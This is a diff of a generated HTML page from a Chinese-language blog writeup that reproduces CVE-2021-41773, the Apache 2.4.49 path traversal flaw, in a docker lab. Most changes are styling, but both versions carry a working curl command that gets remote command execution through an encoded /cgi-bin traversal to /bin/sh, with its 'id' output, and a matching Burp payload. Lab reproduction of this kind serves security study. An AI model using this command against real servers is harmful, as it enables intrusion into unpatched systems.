@@ -14,14 +14,11 @@
   href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap"
   as="style" onload="this.onload=null;this.rel='stylesheet'">
 
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/stackoverflow-dark.min.css"
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/solarized-light.min.css"
    media="print"
   onload="this.media='all';this.onload=null" crossorigin>
 <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/highlight.min.js"
    crossorigin></script>
-
-  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/languages/dart.min.js"
-     crossorigin></script>
 
 <script defer src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/js/all.min.js"
    integrity="sha256-uNYoXefWRqv&#43;PsIF/OflNmwtKM4lStn9yrz2gVl6ymo="  crossorigin></script>
@@ -87,7 +84,7 @@
     },
     "headline": "CVE-2021-41773 Apache HTTPd (2.4.49) | Oulaa","datePublished": "2021-10-10T00:00:00+00:00",
     "dateModified": "2021-10-10T00:00:00+00:00",
-    "wordCount":  49 ,
+    "wordCount":  53 ,
     "author": {
         "@type": "Person",
         "name": ["Oulaa"]
@@ -251,9 +248,15 @@
         <div class="content">
             <h2 id="一-复现环境">一、 复现环境</h2>
 <p><a href="https://github.com/blasty/CVE-2021-41773">https://github.com/blasty/CVE-2021-41773</a></p>
-<pre><code class="language-java">docker-compose build &amp;&amp; docker-compose up -d
-</code></pre>
-<h2 id="二目录穿越">二、目录穿越</h2>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">docker<span style="color:#666">-</span>compose build <span style="color:#666">&amp;&amp;</span> docker<span style="color:#666">-</span>compose up <span style="color:#666">-</span>d
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="二目录穿越">二、目录穿越</h2>
 <p><img src="assets/image-20211009223623-4a18wzi.png" alt="image.png"></p>
 <blockquote>
 <p>不能在浏览器复现，会被自动去掉..</p>
@@ -264,13 +267,26 @@
 <p><strong>所以前提是启用mod_cgid和mod_cgi模块</strong>。</p>
 <h3 id="linux上的apache实现回显rce">Linux上的apache实现回显RCE：</h3>
 <p>在linux上直接可以：</p>
-<pre><code class="language-java">curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' &quot;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&quot;
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre>
-<p>使用burp：</p>
-<pre><code class="language-java">echo Content-Type: text/plain;echo;id
-</code></pre>
-<p><img src="assets/image-20211009225940-oknj3sy.png" alt="image.png"></p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">curl <span style="color:#666">-</span>s <span style="color:#666">--</span>path<span style="color:#666">-</span>as<span style="color:#666">-</span>is <span style="color:#666">-</span>d <span style="">&#39;</span>echo Content<span style="color:#666">-</span>Type<span style="color:#666">:</span> text<span style="color:#666">/</span>plain<span style="color:#666">;</span> echo<span style="color:#666">;</span> id<span style="">&#39;</span> <span style="color:#ba2121">&#34;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&#34;</span>
+uid<span style="color:#666">=</span>33<span style="color:#666">(</span>www<span style="color:#666">-</span>data<span style="color:#666">)</span> gid<span style="color:#666">=</span>33<span style="color:#666">(</span>www<span style="color:#666">-</span>data<span style="color:#666">)</span> groups<span style="color:#666">=</span>33<span style="color:#666">(</span>www<span style="color:#666">-</span>data<span style="color:#666">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>使用burp：</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">echo Content<span style="color:#666">-</span>Type<span style="color:#666">:</span> text<span style="color:#666">/</span>plain<span style="color:#666">;</span>echo<span style="color:#666">;</span>id
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="assets/image-20211009225940-oknj3sy.png" alt="image.png"></p>
 <p>原理：</p>
 <p>直接执行命令无回显的且报500：</p>
 <p><img src="assets/image-20211009225546-rzo6nao.png" alt="image.png"></p>
